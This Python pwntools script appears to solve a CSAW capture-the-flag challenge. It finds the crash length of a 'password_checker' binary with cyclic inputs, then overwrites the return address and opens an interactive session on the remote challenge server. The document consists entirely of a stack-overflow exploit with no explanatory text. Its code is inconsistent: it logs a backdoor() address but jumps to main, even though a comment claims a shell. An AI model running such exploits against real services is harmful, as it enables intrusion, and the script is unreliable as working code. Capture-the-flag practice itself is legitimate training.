from pwn import *

# -fno-stack-protector
FILENAME = 'password_checker'
#FILENAME = './tranquil'

## Bruteforce length ######################
length = 0
for i in range(50,300):
    payload = cyclic(i)
    io = process(FILENAME)
    io.sendline(payload)
    #io.sendline('')
    print(io.recv())
    io.wait()
    exit_code = io.poll()
    #print(exit_code)
    if exit_code == -11:
        length = i
        break

print(length)
e = ELF(FILENAME)
log.info("Address of backdoor(): 0x{:02X}".format(e.symbols["backdoor"]))
for offset in range(length, length+1):
    p = process(FILENAME)
    payload = fit({offset: e.symbols["main"]})
    p.sendline(payload)
    print(p.recv(timeout =1))

p = remote('pwn.chal.csaw.io', 5000)
payload = fit({offset: e.symbols["main"]})
p.sendline(payload)
p.interactive() # Gets into shell to do stuff
